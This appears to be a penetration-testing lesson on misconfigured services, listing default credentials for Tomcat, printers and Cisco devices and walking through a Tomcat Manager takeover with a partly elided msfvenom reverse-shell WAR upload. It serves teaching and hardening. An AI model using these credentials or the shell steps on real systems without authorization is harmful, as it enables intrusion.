# Misconfigured Services and Default Credentials

## 1. Unit Brief: The Human Factor
The software is secure, but the deployment is not. Sysadmins often prioritize "Making it work" over "Making it secure". This leaves debugging interfaces open and passwords at default.

## 2. Real-World Relevance
*   **Jenkins**: A CI/CD tool. Default: No Auth. Impact: RCE (Script Console).
*   **Tomcat**: Java Server. Default: `tomcat/s3cret`. Impact: RCE (Upload WAR file).
*   **Printers**: Web Interface. Default: `admin/admin`. Impact: Leak LDAP credentials used for scanning.

## 3. Core Concepts

### Management Interfaces
Services often listen on weird ports.
*   8080 (Tomcat/Jenkins)
*   8180 (Glassfish)
*   7001 (WebLogic)
*   9200 (Elasticsearch - data leak)

### The "Test" Account
Admins create accounts like `test`, `backup`, `service`, `scanner` and give them weak passwords or forget to delete them.

## 4. Practical Examples

### Exploiting Tomcat
1.  Find Port 8080 open.
2.  Try `tomcat:s3cret` on the Manager App (`/manager/html`).
3.  Access Granted.
4.  Generate a malicious Java payload: `msfvenom -p java/jsp_shell_reverse_tcp ... -f war > shell.war`
5.  Upload `shell.war` via the Manager interface.
6.  Navigate to `/shell`. Reverse Shell obtained.

### Finding Defaults
Google: "Cisco 2960 default password".
Result: `cisco/cisco`.
Try it on the SSH service. It works 30% of the time.

## 5. Common Mistakes Beginners Make
*   **Memorizing defaults**: Don't memorize them. Use a cheatsheet or tool.
*   **Only checking root**: Often the `admin` account is locked, but the `guest` account is open and has Write access to something important.

## 6. Key Takeaways
*   **RTFM**: Read the Manual. It tells you the default password.
*   **Change Defaults**: The first step of hardening any server.
